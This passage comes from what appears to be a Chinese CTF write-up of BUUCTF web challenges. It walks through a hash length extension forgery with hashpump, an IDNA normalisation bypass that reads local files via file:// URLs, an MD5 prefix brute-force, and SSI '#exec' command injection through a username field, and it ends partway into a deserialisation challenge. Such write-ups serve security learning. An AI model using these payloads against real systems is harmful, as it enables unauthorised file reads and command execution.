,只要通过了<code>sign</code>的检测,就可以执行<code>read</code></p><p>利用<code>getsign</code>中字符串拼接的特性,可以获得这个<code>sign</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/geneSign?param=flag.txtread</span><br><span class="line">c43782860279626e3bdd009573349473</span><br><span class="line">=md5(secert_key +&quot;flag.txtread&quot;+&quot;scan&quot;)=md5(secert_key +&quot;flag.txtreadscan&quot;)=md5(secert_key +&quot;flag.txt&quot;+&quot;readscan&quot;)</span><br></pre></td></tr></table></figure><p>将这个值添加进去就能够读取到<code>flag</code>了</p><p><img src="/images/buuctf-web2/image-20221023104440712.png" alt="image-20221023104440712"></p><p>这里还可以通过<code>hashpump</code>工具进行哈希长度扩展攻击:</p><blockquote><p>如果一个应用程序是这样操作的：</p><ol><li>准备了一个密文和一些数据构造成一个字符串，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature&#x2F;签名）</li><li>让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文</li><li>服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值</li></ol><p>这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出<code>&#123;secret || data || attacker_controlled_data&#125;</code>的哈希值<em>。</em></p></blockquote><p>例如本题中的密文就是<code>secret_key</code></p><p>目前掌握的的是<code>md5(secret_key+ &quot;flag.txtscan&quot;)</code>的值,那么我们可以通过工具获得<code>md5(secret_key+ flag.txtscan+read)</code>的值</p><p>这样如果再从<code>action</code>中传 <code>scanread</code> 就可以成功执行<code>read</code>功能了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali㉿kali)-[~/Desktop/HashPump]</span><br><span class="line">└─$ hashpump   </span><br><span class="line">Input Signature: d4bd0b631614327be0367efa305057e5</span><br><span class="line">Input Data: flag.txtscan  (本来追加在secret_key后面的已知数据)</span><br><span class="line">Input Key Length: 16  (secret_key的长度)</span><br><span class="line">Input Data to Add: read  (为了计算新的sign值,我们希望添加的新数据)</span><br><span class="line">aeccfcf28d2da89a3c8581a6c90d1842  (计算结果,新的sign值)</span><br><span class="line">flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read  (新的secret_key后面的已知数据)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><hr><br><h1 id="简单-Futurella"><a href="#简单-Futurella" class="headerlink" title="[简单]Futurella"></a>[简单]Futurella</h1><p>这啥…  除了下面这个看起来有点像flag</p><img src="/images/buuctf-web2/image-20221023155639056.png" alt="image-20221023155639056" style="zoom:67%;" /><p>查看源码直接出flag…….</p><br><hr><br><h1 id="idna规范化字符-nginx配置文件-urlparse-Pythonginx"><a href="#idna规范化字符-nginx配置文件-urlparse-Pythonginx" class="headerlink" title="[idna规范化字符,nginx配置文件,urlparse]Pythonginx"></a>[idna规范化字符,nginx配置文件,urlparse]Pythonginx</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname <span class="comment"># 获取域名</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    </span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line"><span class="comment"># 前面两次检测host中有没有 suctf.cc</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># 这一句用于处理非ascii字符,将其规范化成ascii字符</span></span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)  <span class="comment"># 将host的按照.分割开之后,各自编码再用.连接起来</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure><p>这里先从最后的23行打开url并读取内容处入手, 这里可以通过在<code>url</code>范畴中的<code>file://</code>协议来读取本地文件,但前提是这里我们给的<code>url</code>中必须包含<code>suctf.cc</code>,且不能在前面被检测出来</p><p>关于URL: 完整格式为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</span><br><span class="line">协议://用户:密码@主机host:端口/路径path#片段</span><br></pre></td></tr></table></figure><p>所以,在<code>&quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot;</code> 中:</p><p><strong><code>host</code>部分就是<code>www.baidu.com</code></strong></p><p>关于<code>urllib.parse.urlparse</code>和<code>urllib.parse.urlsplit</code>   <strong>都是解析url的,前者粒度更细:</strong></p><p><code>urllib.parse.urlparse</code>解析后的结果中包含:</p><table><thead><tr><th align="left">属性</th><th align="left">索引</th><th align="left">值</th><th align="left">值（如果不存在）</th></tr></thead><tbody><tr><td align="left"><code>scheme</code></td><td align="left">0</td><td align="left">URL 协议说明符</td><td align="left"><em>scheme</em> 参数</td></tr><tr><td align="left"><code>netloc</code></td><td align="left">1</td><td align="left">网络位置部分</td><td align="left">空字符串</td></tr><tr><td align="left"><code>path</code></td><td align="left">2</td><td align="left">分层路径</td><td align="left">空字符串</td></tr><tr><td align="left"><code>params</code></td><td align="left">3</td><td align="left">Parameters for last path element</td><td align="left">空字符串</td></tr><tr><td align="left"><code>query</code></td><td align="left">4</td><td align="left">查询组件</td><td align="left">空字符串</td></tr><tr><td align="left"><code>fragment</code></td><td align="left">5</td><td align="left">片段标识符</td><td align="left">空字符串</td></tr><tr><td align="left"><code>username</code></td><td align="left"></td><td align="left">用户名</td><td align="left"><a href="https://docs.python.org/zh-cn/3/library/constants.html#None"><code>None</code></a></td></tr><tr><td align="left"><code>password</code></td><td align="left"></td><td align="left">密码</td><td align="left"><a href="https://docs.python.org/zh-cn/3/library/constants.html#None"><code>None</code></a></td></tr><tr><td align="left"><code>hostname</code></td><td align="left"></td><td align="left">主机名（小写）</td><td align="left"><a href="https://docs.python.org/zh-cn/3/library/constants.html#None"><code>None</code></a></td></tr><tr><td align="left"><code>port</code></td><td align="left"></td><td align="left">端口号为整数（如果存在）</td><td align="left"><a href="https://docs.python.org/zh-cn/3/library/constants.html#None"><code>None</code></a></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit, urlparse</span><br><span class="line">url = <span class="string">&quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot;</span></span><br><span class="line"><span class="built_in">print</span>(urlsplit(url))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">SplitResult(</span></span><br><span class="line"><span class="string">    scheme=&#x27;https&#x27;, </span></span><br><span class="line"><span class="string">    netloc=&#x27;username:password@www.baidu.com:80&#x27;, </span></span><br><span class="line"><span class="string">    path=&#x27;/index.html;parameters&#x27;, </span></span><br><span class="line"><span class="string">    query=&#x27;name=tom&#x27;, </span></span><br><span class="line"><span class="string">    fragment=&#x27;example&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(urlparse(url))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ParseResult(</span></span><br><span class="line"><span class="string">    scheme=&#x27;https&#x27;, </span></span><br><span class="line"><span class="string">    netloc=&#x27;username:password@www.baidu.com:80&#x27;, </span></span><br><span class="line"><span class="string">    path=&#x27;/index.html&#x27;, </span></span><br><span class="line"><span class="string">    params=&#x27;parameters&#x27;, </span></span><br><span class="line"><span class="string">    query=&#x27;name=tom&#x27;, </span></span><br><span class="line"><span class="string">    fragment=&#x27;example&#x27;</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>所以上面如果要使用<code>file://</code>来读取文件, 要保证<code>host</code>部分是<code>suctf.cc</code>, 则url的格式就需要是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.cc/path   这里path是本地文件的具体路径</span><br></pre></td></tr></table></figure><p>但这里还需要绕过前面对<code>suctf.cc</code>的过滤,因为<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>这一句的规范化在前两次检测后面, 所以可以将<code>suctf.cc</code>中的字符换成其他<code>unicode</code>字符来绕过前面的检测, 而这些特殊字符会在规范化时被替换成正确的字符,从而通过最后一次检测成功读取文件,例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.cᶜ/</span><br><span class="line">输出:</span><br><span class="line">我扌 your problem? 333</span><br></pre></td></tr></table></figure><p>这里爆了333错误,说明已经通过了过滤,现在需要考虑读取哪些文件</p><p>源码里提示了<code>nginx</code>,那么读取一下<code>nginx</code>的配置文件试试</p><p>可能的路径:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><p>但尝试了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.cᶜ/usr/local/nginx/conf/nginx.conf</span><br><span class="line">file://suctf.cᶜ/etc/nginx/nginx.conf</span><br><span class="line">都会爆 333 错误, 说明ᶜ没有成功被规范化处理,系统仍然认为它和c是不同的两个字符</span><br></pre></td></tr></table></figure><p>那么再换一个其他的字符:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.cⅽ/usr/local/nginx/conf/nginx.conf</span><br><span class="line">读取成功: 得到了flag的路径</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri @app;</span><br><span class="line">    &#125;</span><br><span class="line">    location @app &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass unix:///tmp/uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">    location /static &#123;</span><br><span class="line">        alias /app/static;</span><br><span class="line">    &#125;</span><br><span class="line">    # location /flag &#123;</span><br><span class="line">    #     alias /usr/fffffflag;</span><br><span class="line">    # &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来读取flag文件就可以了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getUrl?url=file://suctf.cⅽ/usr/fffffflag</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="md5爆破-vim泄露-shtml执行命令-EasySearch"><a href="#md5爆破-vim泄露-shtml执行命令-EasySearch" class="headerlink" title="[md5爆破,vim泄露,shtml执行命令]EasySearch"></a>[md5爆破,vim泄露,shtml执行命令]EasySearch</h1><p>存在<code>vim泄露</code>访问 <code>index.php.swp</code>获得源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>; <span class="comment">#共73个字符</span></span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times   随机选5个字符拼接成字符串</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>; <span class="comment">// 生成一个唯一id,后面拼接上刚刚获得的长度为5的随机字符串</span></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123; <span class="comment">//密码md5值的前6位需要是&#x27;6d0bc1&#x27;才能正常登录</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt; // 这里username可以拿来执行命令</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>密码<code>md5</code>值的前6位需要是<code>6d0bc1</code>才能正常登录,那么首先需要爆破一下符合这样条件的字符串:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">chars = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> itertools.product(chars, repeat=<span class="number">4</span>):</span><br><span class="line">    <span class="comment"># 此迭代器product可以叠加笛卡尔积,repeat设为4,也就是chars中字符的任意4位组合</span></span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(s)</span><br><span class="line">    <span class="keyword">if</span> md5(m.encode()).hexdigest()[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 学到了,利用itertools.product来迭代任意组合,只用for的话需要嵌套才能做到</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行结果:</span></span><br><span class="line"> Rbl</span><br><span class="line">RhPd</span><br><span class="line">d`H6</span><br><span class="line">kX!&#125;</span><br></pre></td></tr></table></figure><p>使用爆破出来的密码成功登录, 这里响应头中提示了我们url</p><p><img src="/images/buuctf-web2/image-20221023181519105.png" alt="image-20221023181519105"></p><p>尝试利用<code>username</code>来向目标文件写入一句话木马,然后按照提示的路径访问并执行命令, 但是没有成功</p><img src="/images/buuctf-web2/image-20221023182531101.png" alt="image-20221023182531101" style="zoom:67%;" /><p><strong>新知识点: <code>shtml</code>文件可以执行系统命令, 格式为:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec Cmd=&quot;命令&quot;--&gt;</span><br></pre></td></tr></table></figure><p>那么:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec Cmd=&quot;ls /&quot;--&gt;&amp;password=RhPd</span><br><span class="line">返回路径:public/ee9c0aaa3117e3ddba01d553acd4d3bb279b6ba0.shtml</span><br></pre></td></tr></table></figure><p>访问这个路径,成功回显了执行结果:</p><img src="/images/buuctf-web2/image-20221023183046479.png" alt="image-20221023183046479" style="zoom:67%;" /><p>找一下flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec Cmd=&quot;ls /var/www/html&quot;--&gt;&amp;password=RhPd</span><br><span class="line">Url_is_here: public/91d348bdde783b66958a00e16e2d24690dddb6d1.shtml</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web2/image-20221023183312510.png" alt="image-20221023183312510" style="zoom:67%;" /><p>获得flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec Cmd=&quot;cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=RhPd</span><br><span class="line">Url_is_here: public/ed4a75977a0eb529d431e7d8ece70454361578b5.shtml</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="cookie-Kookie"><a href="#cookie-Kookie" class="headerlink" title="[cookie]Kookie"></a>[cookie]Kookie</h1><p><img src="/images/buuctf-web2/image-20221023191627611.png" alt="image-20221023191627611"></p><p>根据提示,使用 cookie&#x2F;monster 来登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=login&amp;username=cookie&amp;password=monster</span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web2/image-20221023191708409.png" alt="image-20221023191708409"></p><p>登录之后根据响应中的提示, 加上个cookie字段:</p><p><img src="/images/buuctf-web2/image-20221023191815424.png" alt="image-20221023191815424"></p><br><hr><br><h1 id="长度增加的反序列化字符串逃逸-www-zip-piapiapia"><a href="#长度增加的反序列化字符串逃逸-www-zip-piapiapia" class="headerlink" title="[长度增加的反序列化字符串逃逸,www.zip]piapiapia"></a>[长度增加的反序列化字符串逃逸,<a href="http://www.zip]piapiapia">www.zip]piapiapia</a></h1><p>上来又是用户名和密码的输入框,试了半天也没找到注入点</p><p>扫一下网站目录:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py dirsearch.py -u &quot;http://36244f13-8785-4f24-85c0-9a40803e9231.node4.buuoj.cn:81/&quot; --delay=2</span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web2/image-20221023194716766.png" alt="image-20221023194716766"></p><p>访问<code>/www.zip</code>下载到源码备份</p><p><code>index.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>profile.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">show_profile</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span 